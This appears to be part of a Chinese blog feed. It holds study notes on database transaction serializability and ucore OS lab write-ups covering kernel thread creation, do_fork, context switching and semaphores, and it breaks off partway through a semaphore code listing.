<p>为了有效描述冲突操作之间的等价，我们给出以下定义</p>
<p>假如两个操作冲突，那么它们属于不同事务，对同一对象作用，至少有一个是写操作。</p>
<p>交错执行异常有以下几种：</p>
<ul>
<li>读写冲突</li>
<li>写读冲突</li>
<li>写写冲突</li>
</ul>
<p><strong>读写冲突</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     T1                    T2</span><br><span class="line">    BEGIN</span><br><span class="line">10&lt;-R(A)</span><br><span class="line">                         BEGIN</span><br><span class="line">                         R(A) -&gt;10</span><br><span class="line">                         W(A) &lt;-19</span><br><span class="line">                         COMMIT</span><br><span class="line">19&lt;-R(A)</span><br><span class="line">    COMMIT</span><br></pre></td></tr></table></figure>
<p>两次读结果应该是一致的，在这里却不一致。</p>
<p><strong>写读冲突</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">      T1                  T2</span><br><span class="line">    BEGIN</span><br><span class="line">10&lt;-R(A)</span><br><span class="line">12-&gt;W(A)</span><br><span class="line">                         BEGIN</span><br><span class="line">                         R(A)-&gt;12</span><br><span class="line">                         W(A)&lt;-14</span><br><span class="line">                         COMMIT</span><br><span class="line">    ABORT</span><br></pre></td></tr></table></figure>
<p>T2读取T1未提交的更改数据。</p>
<p><strong>写写冲突</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">      T1                  T2</span><br><span class="line">    BEGIN</span><br><span class="line">10-&gt;W(A)</span><br><span class="line"></span><br><span class="line">                         BEGIN</span><br><span class="line">                         W(A)&lt;-19</span><br><span class="line">                         W(A)&lt;-Andy</span><br><span class="line">                         COMMIT</span><br><span class="line">Bieber-&gt;W(B)</span><br><span class="line">    COMMIT</span><br></pre></td></tr></table></figure>
<p>T1提交的数据A被T2覆盖，T2提交的数据B被T1覆盖。</p>
<p>给定以上例子，串行化调度用于检查调度是否正确，而不是用于产生正确的调度。</p>
<p>串行性有不同级别</p>
<ul>
<li><p>冲突串行化</p>
<p>大部分数据库管理系统支持</p>
</li>
<li><p>视图串行化</p>
<p>仅仅是理论</p>
</li>
</ul>
<p>两个调度是等价的，当且仅当：</p>
<ul>
<li>由相同事务的相同操作组成</li>
<li>每组冲突的操作都按照相同顺序执行</li>
</ul>
<p>如果调度S与某个串行调度冲突等价，那么调度S是可串行化冲突。</p>
<p>可通过交换相邻的不同事务的不冲突操作得到可串行化冲突S。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                   T2</span><br><span class="line">BEGIN                BEGIN</span><br><span class="line">R(A)</span><br><span class="line">W(A)</span><br><span class="line">                     R(A)</span><br><span class="line">                     W(A)</span><br><span class="line">R(B)</span><br><span class="line">W(B)</span><br><span class="line">COMMIT</span><br><span class="line">                     R(B)</span><br><span class="line">                     W(B)</span><br><span class="line">                     COMMIT</span><br></pre></td></tr></table></figure>
<p>W(A)与R(B)不冲突，可调换顺序。R(B)和R(A)也不冲突，可再次调换顺序，我们得到以下调度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                   T2</span><br><span class="line">BEGIN               BEGIN</span><br><span class="line">R(A)</span><br><span class="line">W(A)</span><br><span class="line">R(B)</span><br><span class="line">                     R(A)</span><br><span class="line">                     W(A)</span><br><span class="line">W(B)</span><br><span class="line">COMMIT</span><br><span class="line">                     R(B)</span><br><span class="line">                     W(B)</span><br><span class="line">                     COMMIT</span><br></pre></td></tr></table></figure>
<p>类似地，我们也可以得到以下调度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> T1                   T2</span><br><span class="line">BEGIN                BEGIN</span><br><span class="line">R(A)</span><br><span class="line">W(A)</span><br><span class="line">R(B)</span><br><span class="line">W(B)</span><br><span class="line">COMMIT</span><br><span class="line">                     R(A)</span><br><span class="line">                     W(A)</span><br><span class="line">                     R(B)</span><br><span class="line">                     W(B)</span><br><span class="line">                     COMMIT</span><br></pre></td></tr></table></figure>
<p>仅有两个事务的时候可通过简单的交换来构造串行化的调度。</p>
<p>对于更多事务的操作，存在更好的算法吗？</p>
<p><strong>依赖图</strong></p>
<p>每个事务对应一个节点，满足</p>
<ul>
<li><p>$T_i$中的$O_i$操作与$T_j$中的$O_j$冲突</p>
</li>
<li><p>$O_i$比$O_j$出现早</p>
<p>那么就从$T_i$引一条到$T_j$的边。</p>
</li>
</ul>
<p>一个调度是可串行化冲突当且仅当依赖图是无环的。</p>
<p><strong>视图串行性</strong></p>
<p>弱化的串行性，对于调度$S_1$和调度$S_2$，满足</p>
<ul>
<li>$T_1$读入$S_1$中$A$的初始值时，$T_1$也读入$S_2$中$A$的初始值</li>
<li>$T_1$读取$S_1$中$T_2$写入到$A$的值时,$T_1$也读取$S_2$中$T_2$写入到$A$的值时</li>
<li>$T_1$写入到$S_1$中$A$的最终值时，也写入$A$的最终值到$S_2$</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">T1              T2              T3</span><br><span class="line">BEGIN</span><br><span class="line">R(A)</span><br><span class="line">W(A)</span><br><span class="line">COMMIT</span><br><span class="line">               BEGIN</span><br><span class="line">               W(A)</span><br><span class="line">               COMMIT</span><br><span class="line">                               BEGIN</span><br><span class="line">                               W(A)</span><br><span class="line">                               COMMIT</span><br></pre></td></tr></table></figure>
<p>与以下调度视图等价。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">T1              T2              T3</span><br><span class="line">BEGIN</span><br><span class="line">               BEGIN</span><br><span class="line">               W(A)</span><br><span class="line">R(A)</span><br><span class="line">W(A)</span><br><span class="line">COMMIT</span><br><span class="line">               </span><br><span class="line">               COMMIT</span><br><span class="line">                               BEGIN</span><br><span class="line">                               W(A)</span><br><span class="line">                               COMMIT</span><br></pre></td></tr></table></figure>
<p>视图串行化即所有的串行化冲突再附加上随意写的事务，即不限定写入的事务的顺序。</p>
<p>与冲突串行化不同，视图串行化不存在有效验证的方法，目前没有任何数据库支持视图串行化。</p>
<p>以上分析用文氏图表示如下</p>
<p><img src="https://i.loli.net/2020/02/06/MrI5yFLmDUfbcCJ.png"></p>
<h2 id="持久性"><a href="#持久性" class="headerlink" title="持久性"></a>持久性</h2><p>一个事务成功完成后，对数据库的更改是永久的。</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>database systems</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore lab4</title>
    <url>/systems/ucore-lab4/</url>
    <content><![CDATA[<p> 多任务即并行执行多个进程，控制流并发执行。之前的实验中，整个控制流仍为串行执行。ucore lab4在之前实验的基础上进行cpu的虚拟化，即让ucore实现分时共享cpu，实现多条指令流的并发执行。lab4首先涉及的是内核线程管理，指令执行流的单位称为线程，对线程管理就是线程调度和分派。进程作为操作系统分配资源的单位对线程提供支持。</p>
<a id="more"></a>

<h1 id="分配并初始化进程控制块"><a href="#分配并初始化进程控制块" class="headerlink" title="分配并初始化进程控制块"></a>分配并初始化进程控制块</h1><h2 id="创建第0个内核线程idleproc"><a href="#创建第0个内核线程idleproc" class="headerlink" title="创建第0个内核线程idleproc"></a>创建第0个内核线程idleproc</h2><p><code>proc_init</code>首先初始化哈希表，调用<code>alloc_proc</code> ，通过<code>kmalloc</code>分配<code>proc_struct</code>结构的一块内存块，初始化设置<code>idleproc</code>进程控制块的值如下所示。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">alloc_proc</span>(<span class="title">void</span>) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct));</span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	    proc-&gt;state = PROC_UNINIT;</span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;</span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;<span class="comment">//进程所使用的虚拟地址空间</span></span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        <span class="comment">//进程上下文，用于进程切换</span></span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;<span class="comment">//中断帧指针</span></span><br><span class="line">        proc-&gt;cr3 = boot_cr3;<span class="comment">//内核线程</span></span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>寄存器状态、堆栈、当前指令指针等信息是线程控制块的；mm, vma等内存管理字段是进程控制块的；在实际操作系统中，内核线程常驻内存，不需要考虑换入换出页的问题，所以不需要用到mm，所以初始化为NULL。内核线程的cr3等于<code>boot_cr3</code>，即ucore启动时建立的内核虚拟空间的页目录表首地址。</p>
<p>此后，<code>proc_init</code>对<code>idleproc</code>内核线程做进一步初始化：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">idleproc-&gt;pid = <span class="number">0</span>;<span class="comment">//第0个内核线程</span></span><br><span class="line">idleproc-&gt;state = PROC_RUNNABLE;<span class="comment">//就绪态</span></span><br><span class="line">idleproc-&gt;kstack = (<span class="keyword">uintptr_t</span>)bootstack;<span class="comment">//设置堆栈为内核栈</span></span><br><span class="line">idleproc-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">set_proc_name(idleproc, <span class="string">&quot;idle&quot;</span>);</span><br><span class="line">nr_process ++;</span><br></pre></td></tr></table></figure>
<p><code>idleproc</code>主要工作是初始化各个子系统，然后调用<code>cpu_idle</code>等待调度。</p>
<h2 id="创建第1个内核线程initproc"><a href="#创建第1个内核线程initproc" class="headerlink" title="创建第1个内核线程initproc"></a>创建第1个内核线程initproc</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">kernel_thread(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">uint32_t</span> clone_flags) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">tf</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">    tf.tf_cs = KERNEL_CS;</span><br><span class="line">    tf.tf_ds = tf.tf_es = tf.tf_ss = KERNEL_DS;</span><br><span class="line">    tf.tf_regs.reg_ebx = (<span class="keyword">uint32_t</span>)fn;</span><br><span class="line">    tf.tf_regs.reg_edx = (<span class="keyword">uint32_t</span>)arg;</span><br><span class="line">    tf.tf_eip = (<span class="keyword">uint32_t</span>)kernel_thread_entry;</span><br><span class="line">    <span class="keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="number">0</span>, &amp;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中EIP寄存器里存储CPU下次要执行的指令的地址，EBP寄存器里存储栈的栈底指针，通常叫栈基址，EBX存储调用参数。在<code>kernel_thread</code> 中中断帧的ebx设置为fn的函数地址，在跳转到<code>kernel_thread_entry</code>后，通过<code>call *%ebx</code>来调用fn。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kernel_thread_entry:        <span class="meta"># void kernel_thread(void)</span></span><br><span class="line"></span><br><span class="line">    pushl %edx              <span class="meta"># push arg</span></span><br><span class="line">    call *%ebx              <span class="meta"># call fn</span></span><br><span class="line"></span><br><span class="line">    pushl %eax              <span class="meta"># save the return value of fn(arg)</span></span><br><span class="line">    call do_exit            <span class="meta"># call do_exit to terminate current thread</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>请说明proc_struct中struct context context和struct trapframe *tf成员变量含义和在本实验中的作用是啥？</p>
</blockquote>
<p><code>context</code>用于进程切换，存储了当前cpu的上下文(进程切换时需要保存的寄存器)，在进程切换 <code>switch_to</code>中用到。<br><code>trapframe</code>为中断帧，当进程发生特权级转换的时候中断帧记录了进入中断时用户态的上下文，便于中断返回时恢复环境。</p>
<h2 id="为新创建的内核线程分配资源"><a href="#为新创建的内核线程分配资源" class="headerlink" title="为新创建的内核线程分配资源"></a>为新创建的内核线程分配资源</h2><p>创建一个内核线程需要分配和设置好很多资源。<code>kernel_thread</code>函数通过调用<code>do_fork</code>函数完成具体内核线程的创建工作。<code>do_kernel</code>函数会调用<code>alloc_proc</code>函数来分配并初始化一个进程控制块，但<code>alloc_proc</code>只是找到了一小块内存用以记录进程的必要信息，并没有实际分配这些资源。ucore一般通过<code>do_fork</code>实际创建新的内核线程。<code>do_fork</code>的作用是，创建当前内核线程的一个副本，它们的执行上下文、代码、数据都一样，但是存储位置不同。在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态。</p>
<p>在<code>kern/process/proc.c</code>中的<code>do_fork</code>函数中的处理过程。它的大致执行步骤包括：</p>
<ol>
<li>分配并初始化进程控制块（<code>alloc_proc</code>函数）；</li>
<li>分配并初始化内核栈（<code>setup_stack</code>函数）；</li>
<li>根据<code>clone_flag</code>标志复制或共享进程内存管理结构（<code>copy_mm</code>函数）；</li>
<li>设置进程在内核（将来也包括用户态）正常运行和调度所需的中断帧和执行上下文（<code>copy_thread</code>函数）；<br><code>copy_thread</code>在内核堆栈的顶部设置中断帧大小的一块栈空间。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">copy_thread(struct proc_struct *proc, <span class="keyword">uintptr_t</span> esp, struct trapframe *tf) &#123;</span><br><span class="line">    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="number">1</span>;</span><br><span class="line">    *(proc-&gt;tf) = *tf;<span class="comment">//拷贝kernel_thread中的临时中断帧</span></span><br><span class="line">    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;tf-&gt;tf_esp = esp;</span><br><span class="line">    proc-&gt;tf-&gt;tf_eflags |= FL_IF;<span class="comment">//使能中断</span></span><br><span class="line">    proc-&gt;context.eip = (<span class="keyword">uintptr_t</span>)forkret;</span><br><span class="line">    proc-&gt;context.esp = (<span class="keyword">uintptr_t</span>)(proc-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>把设置好的进程控制块放入<code>hash_list</code>和<code>proc_list</code>两个全局进程链表中；</li>
<li>自此，进程已经准备好执行了，把进程状态设置为“就绪”态；</li>
<li>返回子进程的id号。</li>
</ol>
<p><code>do_fork</code>实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">	<span class="keyword">if</span>((proc=alloc_proc())==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">goto</span> fork_out;</span><br><span class="line">	&#125;</span><br><span class="line">	proc-&gt;parent=current;</span><br><span class="line">	<span class="keyword">if</span>(setup_kstack(proc)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">if</span>(copy_mm(clone_flags,proc)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">	&#125;</span><br><span class="line">    copy_thread(proc,<span class="built_in">stack</span>,tf);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid=get_pid();</span><br><span class="line">        hash_proc(proc);</span><br><span class="line">		list_add(&amp;proc-&gt;<span class="built_in">list</span>,&amp;(proc-&gt;list_link));</span><br><span class="line">		nr_process++;</span><br><span class="line">	&#125;</span><br><span class="line">	local_intr_restore(intr_flag);</span><br><span class="line">	</span><br><span class="line">	wakeup_proc(proc);</span><br><span class="line">	</span><br><span class="line">	ret=proc-&gt;pid;</span><br><span class="line">        		</span><br><span class="line">		</span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>请说明ucore是否做到给每个新fork的线程一个唯一的id？</p>
</blockquote>
<p>是的，在<code>do_fork</code>中用<code>get_pid</code>分配pid，不允许中断，不会分配当前未被销毁且已经分配过进程的pid。</p>
<h1 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">proc_run(struct proc_struct *proc) &#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != current) &#123;</span><br><span class="line">        <span class="keyword">bool</span> intr_flag;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">prev</span> =</span> current, *next = proc;</span><br><span class="line">        local_intr_save(intr_flag);</span><br><span class="line">        &#123;</span><br><span class="line">            current = proc;</span><br><span class="line">            load_esp0(next-&gt;kstack + KSTACKSIZE);</span><br><span class="line">            lcr3(next-&gt;cr3);</span><br><span class="line">            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context));</span><br><span class="line">        &#125;</span><br><span class="line">        local_intr_restore(intr_flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>proc_run</code>函数首先将全局变量<code>current</code>指针指向<code>proc</code>，指定当前执行的进程为<code>proc</code>，<code>load_esp0</code>函数将TSS段中对应的成员变量设置为proc的内核栈顶指针，建立好内核线程或将来用户线程在执行特权态切换时的内核堆栈。。lcr3函数将当前的页表切换为proc的页表。之后再调用<code>switch_to</code>汇编函数，将proc的上下文读取到CPU中，在<code>switch_to</code>返回之后，进程正式切换完毕。</p>
<blockquote>
<p>在本实验的执行过程中，创建且运行了几个内核线程？</p>
</blockquote>
<p>本次实验创建了2个内核堆栈，第0个内核线程idleproc初始化内核各个子系统，第1个内核线程在屏幕上输出字符串。</p>
<blockquote>
<p>语句local_intr_save(intr_flag);….local_intr_restore(intr_flag);在这里有何作用?请说明理由</p>
</blockquote>
<p>关闭中断，保证在进程切换的重要时刻不被打断。</p>
<p><code>switch_to</code>汇编代码分析<br>通过调用 <code>switch_to(from,to)</code>完成from和to之间的上下文切换，context结构体如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebx;</span><br><span class="line">    <span class="keyword">uint32_t</span> ecx;</span><br><span class="line">    <span class="keyword">uint32_t</span> edx;</span><br><span class="line">    <span class="keyword">uint32_t</span> esi;</span><br><span class="line">    <span class="keyword">uint32_t</span> edi;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>调用switch栈的的具体内存分布如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">+------------------+  </span><br><span class="line">|       to         |  &lt;- rsp+<span class="number">8</span></span><br><span class="line">|      from        |  &lt;- rsp+<span class="number">4</span></span><br><span class="line">|   <span class="keyword">return</span> address |  &lt;- rsp</span><br><span class="line">+------------------+ </span><br><span class="line">switch_to:                      # switch_to(from, to)</span><br><span class="line"></span><br><span class="line">    # save from&#x27;s registers</span><br><span class="line">    movl <span class="number">4</span>(%esp), %eax          <span class="comment">//from所在地址</span></span><br><span class="line">    popl <span class="number">0</span>(%eax)                <span class="comment">//将返回地址弹出到eax所指向内存单元</span></span><br><span class="line">    movl %esp, <span class="number">4</span>(%eax)          <span class="comment">//保存from的context</span></span><br><span class="line">    movl %ebx, <span class="number">8</span>(%eax)          </span><br><span class="line">    movl %ecx, <span class="number">12</span>(%eax)         </span><br><span class="line">    movl %edx, <span class="number">16</span>(%eax)         </span><br><span class="line">    movl %esi, <span class="number">20</span>(%eax)         </span><br><span class="line">    movl %edi, <span class="number">24</span>(%eax)         </span><br><span class="line">    movl %ebp, <span class="number">28</span>(%eax)         </span><br><span class="line"></span><br><span class="line">此时栈空间与之前不同，</span><br><span class="line">+------------------+  </span><br><span class="line">|       to         |  &lt;- rsp+<span class="number">4</span></span><br><span class="line">|      from        |  &lt;- rsp</span><br><span class="line">+------------------+  </span><br><span class="line">    <span class="comment">//恢复to的上下文</span></span><br><span class="line">    movl <span class="number">4</span>(%esp), %eax          <span class="comment">//to所在地址</span></span><br><span class="line">                                </span><br><span class="line">    movl <span class="number">28</span>(%eax), %ebp         </span><br><span class="line">    movl <span class="number">24</span>(%eax), %edi         </span><br><span class="line">    movl <span class="number">20</span>(%eax), %esi        </span><br><span class="line">    movl <span class="number">16</span>(%eax), %edx        </span><br><span class="line">    movl <span class="number">12</span>(%eax), %ecx         </span><br><span class="line">    movl <span class="number">8</span>(%eax), %ebx          </span><br><span class="line">    movl <span class="number">4</span>(%eax), %esp         </span><br><span class="line"></span><br><span class="line">    pushl <span class="number">0</span>(%eax)               <span class="comment">//eip作为返回地址，转到forkret</span></span><br><span class="line"></span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
<p><code>forkret</code>再调用<code>forkrets</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">forkret(void) &#123;</span><br><span class="line">    forkrets(current-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>forkrets</code>在 <code>trapentry.S</code>中，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.globl __trapret</span><br><span class="line">__trapret:</span><br><span class="line">    <span class="meta"># restore registers from stack</span></span><br><span class="line">    popal</span><br><span class="line"></span><br><span class="line">    <span class="meta"># restore %ds, %es, %fs and %gs</span></span><br><span class="line">    popl %gs</span><br><span class="line">    popl %fs</span><br><span class="line">    popl %es</span><br><span class="line">    popl %ds</span><br><span class="line"></span><br><span class="line">    <span class="meta"># get rid of the trap number and <span class="meta-keyword">error</span> code</span></span><br><span class="line">    addl $<span class="number">0x8</span>, %esp</span><br><span class="line">    iret</span><br><span class="line"></span><br><span class="line">.globl forkrets</span><br><span class="line">forkrets:</span><br><span class="line">    # set stack to this new process&#x27;s trapframe</span><br><span class="line">    movl <span class="number">4</span>(%esp), %esp  <span class="comment">//把esp指向当前进程的中断帧</span></span><br><span class="line">    jmp __trapret</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如何知道ucore的两个线程同在一个进程？</p>
</blockquote>
<p>查看线程控制块中cr3是否一致，即查看两个线程是否为同一页目录表。</p>
<blockquote>
<p>用户态或内核态下的中断处理有什么区别？在trapframe中有什么体现？</p>
</blockquote>
<p>在用户态中断响应时，要切换到内核态；而在内核态中断响应时，没有这种切换；</p>
<p>区别在于<code>tf_esp</code>,<code>tf_ss</code>字段，内核态中断响应不会在内核堆栈压入ss和esp，而用户态中断响应时会在内核堆栈压入ss和esp。</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>ucore</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore lab7</title>
    <url>/systems/ucore-lab7/</url>
    <content><![CDATA[<p>lab6完成了用户进程的调度框架和具体的调度算法，可调度运行多个进程。进程间需要协同操作或访问共享资源，这时候引入了同步互斥问题。本次实验主要是熟悉进程同步机制中的信号量机制，基于信号量机制解决哲学家就餐问题。然后参考信号量机制，实现基于管程的条件变量机制，并给出基于条件变量机制的哲学家就餐问题的解决方案。</p>
<a id="more"></a>

<blockquote>
<p>填写已有实验</p>
</blockquote>
<p>本实验依赖实验1/2/3/4/5/6。请把你做的实验1/2/3/4/5/6的代码填入本实验中代码中有“LAB1”/“LAB2”/“LAB3”/“LAB4”/“LAB5”/“LAB6”的注释相应部分。并确保编译通过。注意：为了能够正确执行lab7的测试应用程序，可能需对已完成的实验1/2/3/4/5/6的代码进行进一步改进。</p>
<p><code>trap.c</code>中对应部分更改如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trap_dispatch</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">        ticks ++;</span><br><span class="line">        assert(current != <span class="literal">NULL</span>);</span><br><span class="line">        run_timer_list();</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>定时器提供了基于时间事件的调度机制，lab7将时间片作为基本的调度和记时单位，实现基于时间长度的睡眠等待和唤醒机制。与lab6相比中断时，lab7调用<code>run_timer_list</code>来更新当前系统时间，遍历当前所有处在系统管理内的定时器，并找出所有到期的进程进行唤醒。</p>
<h1 id="内核级信号量"><a href="#内核级信号量" class="headerlink" title="内核级信号量"></a>内核级信号量</h1><h2 id="内核级信号量描述"><a href="#内核级信号量描述" class="headerlink" title="内核级信号量描述"></a>内核级信号量描述</h2><p>首先分析lab7执行内核哲学家就餐问题的执行流过程。</p>
<ol>
<li>在proc_init中调用kernel_thread创建init内核线程，分配用户程序空间</li>
<li>执行check_sync函数开始对哲学家就餐问题的测试</li>
<li>调用kernel_execve生成了n个内核线程代表n个哲学家</li>
</ol>
<p>接下来具体分析信号量的相关代码。</p>
<p>以下为信号量对应的数据结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span><span class="comment">//理论</span></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line">queueType <span class="built_in">queue</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">//具体实现</span></span><br><span class="line">    <span class="keyword">int</span> value;<span class="comment">//信号量的当前值</span></span><br><span class="line">    <span class="keyword">wait_queue_t</span> wait_queue;<span class="comment">//对应的等待队列</span></span><br><span class="line">&#125; <span class="keyword">semaphore_t</span>;</span><br></pre></td></tr></table></figure>
<p>其中wait相关的数据结构如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span><span class="comment">//等待进程的进程控制块指针</span></span><br><span class="line">    <span class="keyword">uint32_t</span> wakeup_flags;<span class="comment">//原因标记</span></span><br><span class="line">    <span class="keyword">wait_queue_t</span> *wait_queue;<span class="comment">//对应等待队列</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> wait_link;<span class="comment">//对应wait_queue_t</span></span><br><span class="line">&#125; <span class="keyword">wait_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> wait_head;</span><br><span class="line">&#125; <span class="keyword">wait_queue_t</span>;</span><br></pre></td></tr></table></figure>
<p>信号量初始化完成后只能通过<code>P()</code>和<code>V()</code>修改，ucore中对应的函数为<code>down()</code>和<code>up()</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Semaphore::P() &#123;</span><br><span class="line">   sem--;</span><br><span class="line">   <span class="keyword">if</span> (sem &lt; <span class="number">0</span>) &#123;</span><br><span class="line">     Add <span class="keyword">this</span> thread t to q;</span><br><span class="line">     block(t);</span><br><span class="line">     <span class="comment">//wakeup</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//else return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">uint32_t</span> __down(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    <span class="comment">//若资源还有剩余，则信号量值减一</span></span><br><span class="line">    <span class="keyword">if</span> (sem-&gt;value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sem-&gt;value --;</span><br><span class="line">        local_intr_restore(intr_flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 